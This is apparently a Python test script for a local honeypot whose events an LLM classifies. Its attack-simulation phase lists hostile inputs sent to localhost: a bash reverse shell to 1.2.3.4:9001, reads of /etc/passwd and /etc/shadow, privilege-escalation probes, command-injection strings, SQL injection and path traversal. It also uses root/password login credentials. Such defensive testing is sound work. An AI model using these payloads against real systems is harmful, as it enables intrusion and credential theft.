import requests
import paramiko
import time
import json
import base64
import socket

def test_endpoint(name, url, method="GET", expected_status=200):
    start = time.time()
    try:
        if method == "GET":
            res = requests.get(url, timeout=5)
        elif method == "POST":
            res = requests.post(url, timeout=5)
        elapsed = time.time() - start
        if res.status_code == expected_status:
            return True, f"Pass ({elapsed*1000:.0f}ms)", res.json() if res.headers.get("content-type") == "application/json" else res.text
        return False, f"Fail: {res.status_code} ({elapsed*1000:.0f}ms)", res.text
    except Exception as e:
        return False, f"Error: {e}", str(e)

def test_ssh_command(cmd, wait=0.5):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # Default credentials for this honeypot are often root/password
        client.connect("127.0.0.1", port=2222, username="root", password="password", timeout=5)
        shell = client.invoke_shell()
        shell.settimeout(3.0)
        time.sleep(0.5)
        if shell.recv_ready():
            shell.recv(4096) # clear banner

        start = time.time()
        shell.send(cmd + "\n")
        time.sleep(wait)
        out = ""
        while shell.recv_ready():
            out += shell.recv(4096).decode('utf-8', errors='ignore')
        elapsed = time.time() - start
        client.close()
        return True, f"Pass ({elapsed*1000:.0f}ms)", out
    except Exception as e:
        return False, f"Error: {e}", ""

def test_http_attack(payload):
    start = time.time()
    try:
        res = requests.post("http://127.0.0.1:8080/login", data={"username": payload, "password": "password"}, timeout=5)
        elapsed = time.time() - start
        return True, f"Pass ({elapsed*1000:.0f}ms)", res.text
    except Exception as e:
        return False, f"Error: {e}", str(e)

def run_all():
    print("=== PHASE 0: ENVIRONMENT & HEALTH CHECK ===")
    
    endpoints = [
        ("Core API Status", "http://localhost:5020/control/status"),
        ("HTTP Status", "http://localhost:5020/control/http/status"),
        ("SSH Status", "http://localhost:5020/control/ssh/status"),
        ("Tunnels Status", "http://localhost:5020/control/tunnels"),
    ]
    for name, url in endpoints:
        ok, msg, data = test_endpoint(name, url)
        print(f"[{'PASS' if ok else 'FAIL'}] {name} - {msg}")
        if ok and isinstance(data, dict):
            print(f"       -> {data}")

    print("\nOllama / LLM check explicitly:")
    try:
        res = requests.get("http://localhost:11434/api/tags", timeout=5)
        if res.status_code == 200:
            print(f"[PASS] Ollama running. Models: {[m['name'] for m in res.json().get('models',[])]}")
        else:
            print(f"[FAIL] Ollama HTTP status: {res.status_code}")
    except Exception as e:
        print(f"[FAIL] Ollama connection: {e}")

    print("\n=== PHASE 1: CONTROL & TOGGLE VALIDATION ===")
    toggles = [
        ("Stop HTTP", "http://localhost:5020/control/http/stop"),
        ("Start HTTP", "http://localhost:5020/control/http/start"),
        ("Stop SSH", "http://localhost:5020/control/ssh/stop"),
        ("Start SSH", "http://localhost:5020/control/ssh/start"),
    ]
    for name, url in toggles:
        ok, msg, data = test_endpoint(name, url, method="POST")
        print(f"[{'PASS' if ok else 'FAIL'}] {name} - {msg}")
        time.sleep(1) # wait a moment for Docker to actually start/stop it

    print("\nAI Mode Switch:")
    for mode in [1, 2, 3]:
        url = f"http://localhost:5020/control/ai_mode?mode={mode}"
        ok, msg, data = test_endpoint(f"Set AI Mode {mode}", url, method="POST")
        print(f"[{'PASS' if ok else 'FAIL'}] Mode {mode} - {msg}")
        
    print("\n=== PHASE 2: NORMAL ACTIVITY TESTING ===")
    ssh_normals = ['whoami', 'pwd', 'ls -la', 'cd /var/log && pwd', 'cat /etc/os-release']
    for cmd in ssh_normals:
        ok, msg, out = test_ssh_command(cmd)
        print(f"[{'PASS' if ok else 'FAIL'}] SSH: {cmd} - {msg}")

    print("\n=== PHASE 3: CONSISTENCY TESTING ===")
    print("Testing 'ls' multiple times")
    for _ in range(3):
        ok, msg, out = test_ssh_command("ls")
        print(f"[{'PASS' if ok else 'FAIL'}] SSH: ls - {msg}")
        
    print("\n=== PHASE 4: ATTACK SIMULATION (COMPREHENSIVE) ===")
    print("A. SSH Attacks:")
    ssh_attacks = [
        '; ls',
        '&& whoami',
        'echo test | sh',
        'bash -i >& /dev/tcp/1.2.3.4/9001 0>&1', # Reverse shell payload
        'cat /etc/passwd',
        'find / -perm -4000',
        'sudo -l',
        'su root',
        'cat ../../../etc/shadow'
    ]
    for cmd in ssh_attacks:
        ok, msg, out = test_ssh_command(cmd, wait=1.5)
        print(f"[{'PASS' if ok else 'FAIL'}] ATTACK SSH: {cmd} - {msg}")

    print("\nB. HTTP Attacks:")
    http_attacks = [
        "' OR 1=1 --",
        "' UNION SELECT NULL,NULL--",
        "../../../../etc/passwd",
        "; whoami",
        "| id",
        "A"*500 # fuzzing long payload
    ]
    for cmd in http_attacks:
        ok, msg, out = test_http_attack(cmd)
        print(f"[{'PASS' if ok else 'FAIL'}] ATTACK HTTP: {cmd} - {msg}")
        
    print("\n=== PHASE 5: EVENT LOG CHECK ===")
    try:
        with open("data/logs/events.log", "r") as f:
            lines = f.readlines()
            print(f"[PASS] Read events.log - {len(lines)} total events logged.")
            if lines:
                last_event = json.loads(lines[-1])
                print(f"       Last event sample details: {last_event.get('details')}")
                print(f"       Classification: {last_event.get('ai_classification')} | Risk: {last_event.get('risk_score')}")
    except Exception as e:
        print(f"[FAIL] Could not read logs: {e}")

if __name__ == "__main__":
    run_all()
